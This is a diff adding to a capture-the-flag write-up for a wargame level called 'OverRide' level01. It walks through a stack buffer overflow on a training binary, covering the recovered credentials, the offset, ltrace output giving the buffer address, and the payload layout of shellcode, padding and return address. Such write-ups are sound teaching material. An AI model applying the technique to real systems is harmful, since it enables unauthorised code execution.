@@ -66,3 +66,73 @@ gdb-peda$ info variables
 
 We see there are functions, and global variable declared.
 
+by decompiling the source, we at least have an idea what the username and password is, `[dat_wil] and [admin]`
+
+but regardless of giving input with 'correct' id and password..
+
+```
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+admin
+nope, incorrect password...
+
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+aaaaaaaaaaaaaaaa
+nope, incorrect password...
+
+level01@OverRide:~$
+```
+
+needs more xxxxxxxxxxxxxx
+
+from using [Buffer overflow pattern generator
+](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?), the offset is 80
+
+As the program use fgets() function we should not be able to make a buffer overflow but fgets() take a max string of 100 chars wich is more than the size of our buffer (64). XXXXXXXXXXX
+
+to create a payload, we first need to put username + '\n'.
+
+Then, the offset (80 bytes) consist of shellcode and padding needs to be fedd, then the address needs to be provided.
+
+from using `ltrace`, the address where password is stored can be easily found `=0xffffd69c`
+
+```
+level01@OverRide:~$ ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+) = 39
+printf("Enter Username: ")                  = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)         = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)            = 24
+puts("Enter Password: "Enter Password:
+)                    = 17
+fgets( <unfinished ...>
+--- SIGWINCH (Window changed) ---
+--- SIGWINCH (Window changed) ---
+aaaaaaaaaaaaaaaaaaaaaaaa
+<... fgets resumed> "aaaaaaaaaaaaaaaaaaaaaaaa\n", 100, 0xf7fcfac0) = 0xffffd69c
+puts("nope, incorrect password...\n"nope, incorrect password...
+
+)       = 29
++++ exited (status 1) +++
+```
+
+so the final payload will be below
+
+```
+[input for first]    [         shellcode + padding (within size of offset)           ] + [     address     ]
+  dat_wil + '\n'  +    shellcode (28 bytes, or any) + random characters (80-28 = 52)   +  \x9c\xd6\xff\xff
+```
+
